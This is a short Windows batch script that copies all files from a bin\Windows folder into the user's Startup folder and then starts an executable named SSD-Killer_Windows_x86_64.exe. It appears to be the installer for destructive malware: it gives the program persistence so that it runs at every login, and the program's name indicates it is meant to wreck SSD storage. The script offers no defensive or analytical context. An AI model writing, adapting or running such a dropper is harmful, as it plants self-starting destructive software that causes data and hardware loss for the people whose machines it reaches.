@echo off
cd "bin\Windows"
copy /b "*.*" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer_Windows_x86_64.exe"
